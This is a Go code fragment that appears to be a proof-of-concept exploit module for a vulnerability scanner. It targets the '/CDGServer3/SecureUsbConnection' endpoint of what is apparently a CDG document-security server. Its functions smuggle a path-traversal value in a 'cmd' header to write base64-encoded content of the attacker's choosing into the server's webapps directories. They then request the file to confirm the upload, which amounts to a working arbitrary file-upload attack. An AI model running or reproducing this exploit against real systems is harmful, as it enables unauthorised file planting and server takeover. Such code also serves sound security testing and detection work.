	sendPayloadSecureUsbConnectionXOIUWRNDASIJ := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/CDGServer3/SecureUsbConnection")
		postRequestConfig.Header.Store("cmd", cmd)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Accept", "*/*")
		//postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = ""
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	checkFileSecureUsbConnectionQZKEHDJWJKQ := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig(filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	uploadFlagoDpJMRn := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		savePathMap := map[string]string{
			`/idmstudy/` + filename: `/idmstudy/` + filename,
			`/ROOT/` + filename:     `/` + filename,
		}
		for filename := range savePathMap {
			if resp, err := sendPayloadSecureUsbConnectionXOIUWRNDASIJ(hostInfo, fmt.Sprintf("$$$$$./../webapps/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content)))); resp == nil && err != nil {
				return nil, err
			}
			if resp, _ := checkFileSecureUsbConnectionQZKEHDJWJKQ(hostInfo, savePathMap[filename]); resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
				return resp, nil
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

